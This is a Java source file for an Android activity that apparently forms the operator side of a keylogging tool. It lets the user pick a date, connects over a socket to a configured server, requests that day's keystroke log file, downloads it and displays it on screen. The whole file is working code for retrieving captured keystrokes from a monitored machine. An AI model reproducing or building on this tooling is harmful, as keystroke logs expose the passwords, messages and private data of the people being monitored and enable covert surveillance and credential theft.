package sour.project.be;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Calendar;

import sour.project.be.data.Controls;
import sour.project.be.data.Server;
import android.app.DatePickerDialog;
import android.app.Dialog;
import android.app.DialogFragment;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.DatePicker;
import android.widget.TextView;
import android.widget.Toast;

public class KeyloggerActivity extends AppCompatActivity {

	private static int year, month, day;
	private static long dateInMillis;
	private static Button btnGetLogs;
	private static String keylogFileName;

	private TextView tvLogViewer;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_keylogger);
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		final Calendar c = Calendar.getInstance();
		year = c.get(Calendar.YEAR);
		month = c.get(Calendar.MONTH) + 1;
		day = c.get(Calendar.DAY_OF_MONTH);
		dateInMillis = c.getTimeInMillis();
		getKeylogFilename();
		Button btnSelectDate = (Button) findViewById(R.id.btnSelectDate);
		btnSelectDate.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				DialogFragment dialogFragment = new DatePickerFragment();
				dialogFragment.show(getFragmentManager(), "datePicker");
			}
		});

		btnGetLogs = (Button) findViewById(R.id.btnGetLogs);
		btnGetLogs.setText("Get logs for " + getDispDate());
		btnGetLogs.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				new KeyloggerTask(Controls.KEYLOGGER).execute();
			}
		});
		tvLogViewer = (TextView) findViewById(R.id.tvLogViewer);
	}

	public static class DatePickerFragment extends DialogFragment implements
			DatePickerDialog.OnDateSetListener {

		@Override
		public Dialog onCreateDialog(Bundle savedInstanceState) {
			// Use the current date as the default date in the picker

			Log.d(App.TAG, year + "-" + month + "-" + day);
			// Create a new instance of DatePickerDialog and return it
			DatePickerDialog dpDialog = new DatePickerDialog(getActivity(),
					this, year, month, day);
			dpDialog.getDatePicker().setMaxDate(dateInMillis);
			return dpDialog;
		}

		@Override
		public void onDateSet(DatePicker view, int yearNew, int monthOfYear,
				int dayOfMonth) {
			year = yearNew;
			month = monthOfYear + 1;
			day = dayOfMonth;
			Log.d(App.TAG, year + "-" + month + "-" + day);
			getKeylogFilename();
			String dispDate = getDispDate();
			Log.d(App.TAG, dispDate);
			Log.d(App.TAG, keylogFileName);
			btnGetLogs.setText("Get logs for " + dispDate);
		}
	}

	private static String getDispDate() {
		String dispDate = day + "/" + month + "/" + (year % 100);
		return dispDate;
	}

	private static void getKeylogFilename() {
		keylogFileName = "" + ((day < 10) ? ("0" + day) : day);
		keylogFileName += "_" + ((month < 10) ? ("0" + month) : month);
		keylogFileName += "_" + year + ".txt";
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		// getMenuInflater().inflate(R.menu.keylogger, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		if (id == android.R.id.home) {
			onBackPressed();
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	private class KeyloggerTask extends AsyncTask<Void, Void, String> {

		int errorCode = -1;
		int control;

		Socket client = null;

		public KeyloggerTask(int _control) {
			control = _control;
		}

		@Override
		protected void onPostExecute(String result) {
			if (errorCode > 0) {
				Toast.makeText(getApplicationContext(), "Unable to connect",
						Toast.LENGTH_SHORT).show();
			}
			if (result != null) {
				try {
					String log = "";
					FileInputStream fis = openFileInput("keylog.txt");
					int c;
					while ((c = fis.read()) != -1) {
						log += Character.toString((char) c);
					}
					tvLogViewer.setText(log);
				} catch (FileNotFoundException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
			} else {
				Toast.makeText(getApplicationContext(), "Log not found",
						Toast.LENGTH_SHORT).show();
			}
		}

		@Override
		protected String doInBackground(Void... params) {

			errorCode = -1;

			try {
				client = new Socket(Server.IP, Server.PORT);
				PrintWriter pw = new PrintWriter(client.getOutputStream(), true);
				Log.d(App.TAG, "about to write control: " + control);
				pw.println(control);
				Log.d(App.TAG, "wrote control: " + control);
				pw.println(keylogFileName);
				Log.d(App.TAG, "wrote filename: " + keylogFileName);

				FileOutputStream fos = openFileOutput("keylog.txt",
						Context.MODE_PRIVATE);
				Log.d(App.TAG, "Created FileOutputStream");
				int byteCount = 2048;
				byte[] buffer = new byte[byteCount];
				Log.d(App.TAG, "Created byte buffer");
				InputStream is = client.getInputStream();
				int smallBuffLen = "111".getBytes().length;
				Log.d(App.TAG, "small len: " + smallBuffLen);
				BufferedInputStream bis = new BufferedInputStream(is,
						smallBuffLen);
				byte[] smallBuff = new byte[smallBuffLen];
				bis.read(smallBuff, 0, smallBuffLen);
				String valid = new String(smallBuff);
				Log.d(App.TAG, "recieved validity: " + valid);
				if (valid.equals("000")) {
					return null;
				}
				Log.d(App.TAG, "Received valid indication from device: "
						+ valid);
				Log.d(App.TAG, "Created inputstream");
				bis = new BufferedInputStream(is, byteCount);
				int i = 0, fileSize = 0;
				Log.d(App.TAG, "About to start receiving.");
				while ((i = bis.read(buffer, 0, byteCount)) != -1) {
					fileSize += i;
					fos.write(buffer, 0, i);
					fos.flush();
				}
				Log.d(App.TAG, "File Length: " + fileSize);
				String path = getFileStreamPath("keylog.txt").getAbsolutePath();
				pw.close();
				return path;

			} catch (UnknownHostException e) {
				Log.d(App.TAG, "unknown host");
				e.printStackTrace();
				errorCode = 0;
			} catch (IOException e) {
				Log.d(App.TAG, "io #1");
				e.printStackTrace();
				errorCode = 1;
			} finally {
				try {
					if (client != null)
						client.close();
				} catch (IOException e) {
					Log.d(App.TAG, "io #2");
					e.printStackTrace();
					errorCode = 2;
				}
			}
			return null;
		}
	}
}
